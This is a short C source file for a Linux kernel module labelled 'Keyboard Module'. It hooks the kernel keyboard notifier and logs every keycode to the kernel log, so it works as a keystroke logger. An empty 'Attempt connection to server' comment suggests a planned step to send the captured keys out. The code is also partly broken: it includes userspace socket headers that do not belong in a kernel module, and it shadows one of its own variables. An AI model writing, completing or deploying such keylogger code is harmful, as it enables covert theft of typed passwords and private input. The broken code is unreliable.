#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/printk.h>
#include <sys/socket.h>
#include <sys/socketvar.h>

static int keyboard_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    
    // Check if it's a key event
    if (code == KBD_KEYCODE)
    {
        // Access the keyboard event data
        struct keyboard_notifier_param param = *(struct keyboard_notifier_param *)_param;
        struct vc_data *vc = param.vc;
        unsigned int keycode = param.value;
        
        // Process the key event as needed
        // ...
        printk(KERN_INFO "Keycode: %u\n", keycode);
    }
    
    // Return NOTIFY_OK to allow further processing of the event
    return NOTIFY_OK;
}

static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_callback
};

static int __init keyboard_module_init(void)
{
    // Register the keyboard notifier
    register_keyboard_notifier(&keyboard_nb);

    // Attempt connection to server
    

    return 0;
}

static void __exit keyboard_module_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_nb);
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Angelo");
MODULE_DESCRIPTION("Keyboard Module");